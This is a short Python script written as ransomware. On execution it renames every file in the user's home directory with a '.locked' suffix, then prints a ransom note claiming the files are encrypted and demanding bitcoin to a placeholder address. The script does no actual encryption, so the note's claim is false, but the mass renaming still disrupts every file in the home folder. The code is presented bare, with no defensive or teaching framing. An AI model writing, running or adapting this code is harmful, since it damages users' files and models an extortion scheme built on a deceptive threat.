import os
import time

WARNING_MESSAGE = """
WARNING: YOUR FILES HAVE BEEN ENCRYPTED!

To recover your files, send 1 BTC to the following address:
1Fak3BTCAddr3ssDontUs3REALoneXyZ123
"""

def encrypt_files(directory):
    for root, _, files in os.walk(directory):
        for file in files:
            if not file.endswith(".locked"):
                old_path = os.path.join(root, file)
                new_path = os.path.join(root, file + ".locked")
                os.rename(old_path, new_path)

def display_ransom_note():
    print(WARNING_MESSAGE)
    time.sleep(2)

if __name__ == "__main__":
    user_home = os.path.expanduser("~")
    encrypt_files(user_home)
    display_ransom_note()
